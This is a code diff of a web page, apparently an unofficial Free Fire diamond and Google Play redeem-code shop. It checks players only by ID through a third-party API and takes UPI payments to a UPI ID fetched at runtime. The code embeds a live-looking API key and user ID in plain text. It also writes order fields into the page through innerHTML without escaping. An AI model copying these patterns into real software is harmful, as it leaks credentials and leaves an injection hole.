+        function handleLogin() {
+            if (LOGGED_IN_UID) {
+                logout();
+            } else {
+                fetchAccountInfo();
+            }
         }
 
-        // Database Injection logic controller
-        function updateData() {
-            const v = document.getElementById('newVersion').value.trim();
-            const u = document.getElementById('newUrl').value.trim();
+        async function fetchAccountInfo() {
+            const uid = document.getElementById('targetUid').value;
+            const btn = document.getElementById('loginBtn');
+            if(!uid) return alert("Enter Player ID");
+
+            btn.innerText = "...";
+            const useruid = "Q3Jv76LyFpQgTKUY0GTce22vkho1"; 
+            const apiKey = "fxPUTo0htYWZLxDUNqzGLvSdGwgvPq"; 
+            const apiUrl = `https://proapis.hlgamingofficial.com/main/games/freefire/account/api?sectionName=AllData&PlayerUid=${uid}&region=IND&useruid=${useruid}&api=${apiKey}`;
+
+            try {
+                const response = await fetch(apiUrl);
+                const json = await response.json();
+                if(json.result && json.result.AccountInfo) {
+                    const info = json.result.AccountInfo;
+                    LOGGED_IN_NAME = info.AccountName;
+                    document.getElementById('m-name').innerText = info.AccountName;
+                    document.getElementById('m-uid').innerText = uid;
+                    document.getElementById('m-level').innerText = info.AccountLevel;
+                    document.getElementById('m-likes').innerText = info.AccountLikes;
+                    document.getElementById('m-guild').innerText = json.result.GuildInfo ? json.result.GuildInfo.GuildName : "None";
+                    document.getElementById('accountModal').style.display = 'flex';
+                } else { alert("ID Not Found!"); }
+            } catch (err) { alert("API Error"); }
+            btn.innerText = "Login";
+        }
+
+        function confirmIdentity() {
+            LOGGED_IN_UID = document.getElementById('targetUid').value;
+            document.getElementById('accountModal').style.display = 'none';
+            document.getElementById('idSuccess').style.display = 'flex';
             
-            if(v === "" || u === "") {
-                showModal('warningModal'); // Custom UI Warning Popup
-                return;
-            }
+            setTimeout(() => {
+                document.getElementById('idSuccess').style.display = 'none';
+                document.getElementById('targetUid').disabled = true;
+                const btn = document.getElementById('loginBtn');
+                btn.innerText = "Logout";
+                btn.classList.add('logout-btn');
+                document.getElementById('social-login-ui').style.display = 'none';
+                document.getElementById('history-section').style.display = 'block';
+                loadHistory();
+            }, 1500);
+        }
 
-            db.ref('appConfig').set({ 
-                latestVersion: v, 
-                updateUrl: u 
-            }).then(() => {
-                document.getElementById('successDesc').innerText = `Version v${v} has been successfully compiled and distributed across all node systems.`;
-                showModal('successModal'); // Custom UI Success Popup
-                document.getElementById('newVersion').value = "";
-                document.getElementById('newUrl').value = "";
-            }).catch((error) => {
-                alert("Database Engine Fault: " + error.message);
+        function logout() {
+            LOGGED_IN_UID = null;
+            document.getElementById('targetUid').disabled = false;
+            document.getElementById('targetUid').value = "";
+            const btn = document.getElementById('loginBtn');
+            btn.innerText = "Login";
+            btn.classList.remove('logout-btn');
+            document.getElementById('social-login-ui').style.display = 'block';
+            document.getElementById('history-section').style.display = 'none';
+        }
+
+        function loadHistory() {
+            const list = document.getElementById('history-list');
+            list.innerHTML = "<p style='font-size:10px; color:#999;'>Loading orders...</p>";
+            
+            database.ref('orders').orderByChild('uid').equalTo(LOGGED_IN_UID).on('value', (snap) => {
+                list.innerHTML = "";
+                const data = snap.val();
+                if(!data) {
+                    list.innerHTML = "<p style='font-size:10px; color:#999;'>No history found.</p>";
+                    return;
+                }
+                Object.values(data).reverse().forEach(order => {
+                    list.innerHTML += `
+                        <div class="history-card">
+                            <div class="h-info">
+                                <b>${order.item}</b>
+                                <span>UTR: ${order.utr}</span>
+                            </div>
+                            <span class="status-pill status-${order.status}">${order.status}</span>
+                        </div>`;
+                });
+            });
+        }
+
+        function openPayment(name, price) {
+            if(!LOGGED_IN_UID) { alert("Please Login First!"); return; }
+            document.getElementById('pay-item').innerText = name;
+            document.getElementById('pay-price').innerText = price;
+            
+            // UPDATED: Ab static ID ki jagah runtime fetched DYNAMIC_UPI_ID use hoga
+            const upi = DYNAMIC_UPI_ID; 
+            const amt = price.replace('₹ ', '');
+            document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=${upi}%26am=${amt}%26cu=INR`;
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        function submitPayment() {
+            const utr = document.getElementById('utr-box').value;
+            const item = document.getElementById('pay-item').innerText;
+            const price = document.getElementById('pay-price').innerText;
+
+            if(utr.length < 12) return alert("Enter 12 digit UTR");
+
+            const orderData = {
+                uid: LOGGED_IN_UID,
+                name: LOGGED_IN_NAME,
+                item: item,
+                price: price,
+                utr: utr,
+                status: "Pending",
+                timestamp: Date.now()
+            };
+
+            database.ref('orders').push(orderData).then(() => {
+                document.getElementById('paymentModal').style.display = 'none';
+                const msg = item.includes("Redeem") 
+                    ? "Your redeem code will be visible in history within <b>1 hour</b>."
+                    : "Diamonds will be added to your account within <b>24 hours</b>.";
+                document.getElementById('success-msg').innerHTML = msg;
+                document.getElementById('finalModal').style.display = 'flex';
+            });
+        }
+
+        function buyRedeem() {
+            const amt = document.getElementById('redeem-amt').value;
+            if(amt < 10) return alert("Min ₹10");
+            openPayment("Google Play Redeem Code", "₹ " + amt);
+        }
+
+        function closeAllModals() {
+            document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
+            document.getElementById('utr-box').value = "";
+        }
+
+        function showTab(type) {
+            document.getElementById('purchase-grid').style.display = type === 'purchase' ? 'flex' : 'none';
+            document.getElementById('redeem-view').style.display = type === 'redeem' ? 'block' : 'none';
+            document.querySelectorAll('.btn-tab').forEach((t, i) => {
+                t.classList.toggle('active', (type==='purchase' && i===0) || (type==='redeem' && i===1));
             });
         }
     </script>
+</div>
 </body>
 </html>
